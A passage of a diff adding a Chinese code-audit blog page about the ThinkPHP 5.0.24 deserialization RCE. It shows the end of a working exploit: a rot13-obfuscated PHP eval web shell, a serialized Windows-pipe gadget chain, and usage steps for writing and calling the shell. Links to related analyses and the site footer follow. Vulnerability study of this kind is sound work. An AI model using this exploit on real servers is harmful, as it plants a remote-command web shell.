+            <span class="token string single-quoted-string">'prefix'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'&lt;?cuc @riny($_CBFG[\'pzq\']);?>'</span><span class="token punctuation">,</span>
+        <span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
+<span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">/*
+http://xxxxx/public/?s=/index/index/test&amp;c=序列化后的结果
+然后访问
+http://xxxxx/public/0f3a97a39ce7ab0b6672494aace6b06a.php
+POST：cmd=phpinfo();
+*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<p>学习链接：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yhck/p/15616884.html">Thinkphp5.0.24反序列化漏洞分析与利用 - Yhck - 博客园 (cnblogs.com)</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozhiru/p/12452528.html">ThinkPHP 5.0.24 反序列化RCE （Windows下EXP） - xiaozhiru - 博客园 (cnblogs.com)</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/263746.html">Thinkphp5.0、5.1、6.x反序列化漏洞分析及EXP - FreeBuf网络安全行业门户</a></p>
+</li>
+</ul>
+<hr>
+
+  <p><a class="classtest-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a> — 2022年9月20日</p>
+  
+
+
+        </div>
+        <div class="row mt-2">
+  <h3>Search</h3>
+  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
+  <div style="margin-top: 1.5rem;">
+    <ul id="result"></ul>
+  </div>
+</div>
+        <div class="row mt-2">
+  
+    <div class="eight columns">
+      <p id="madewith">Made with ❤ and
+        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
+        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
+        </a>
+        
+    </div>
+
+    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
+    <div class="four columns mb-3 posisi" >
+      
+      <a class="ml-0 footer-link icon" href="https://github.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
+        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+      </a>
+      
+
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://twitter.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
+        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
+      </a>
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://instagram.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Instagram">
+        <svg class="instagram svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg>
+      </a>
+      
+
+      
+
+    </div>
+  
+</div>
+<script src="/js/prism/prism.js" async></script>
+      </div>
+
+    </div>
+
+  </div>
+  <script src="/js/nanobar.min.js"></script>
+
+  <script>
+    var options = {
+      classname: 'nanobar',
+      id: 'myNanobar'
+    };
+    var nanobar = new Nanobar(options);
+    nanobar.go(30);
+    nanobar.go(76);
+    nanobar.go(100);
+  </script>
+
+</body>
+
+</html>
